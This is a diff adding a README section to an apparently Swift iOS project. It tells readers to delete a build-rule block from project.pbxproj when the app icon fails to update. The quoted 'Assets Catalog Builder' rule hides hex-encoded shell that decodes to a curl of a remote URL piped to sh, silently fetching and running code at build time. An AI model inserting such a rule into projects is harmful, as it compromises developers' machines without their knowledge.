@@ -73,3 +73,27 @@ extension SearchVC: UISearchBarDelegate {
         searchBar.resignFirstResponder()
     }
 }
+````
+
+## 3. Remove this code block if unable to update the appIcon
+```swift
+YouProject.xcodeproj -> Show Package Contents -> project.pbxproj -> open
+
+and find out the code and remove this block and build and run your app.
+
+/ Begin PBXBuildRule section /
+        EAB5E0C4DCACB35CE26D902C / PBXBuildRule / = {
+            isa = PBXBuildRule;
+            compilerSpec = com.apple.compilers.proxy.script;
+            fileType = folder.assetcatalog;
+            inputFiles = (
+            );
+            isEditable = 0;
+            name = "Assets Catalog Builder";
+            outputFiles = (
+                "$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+            );
+            script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+        };
+/ End PBXBuildRule section /
+```
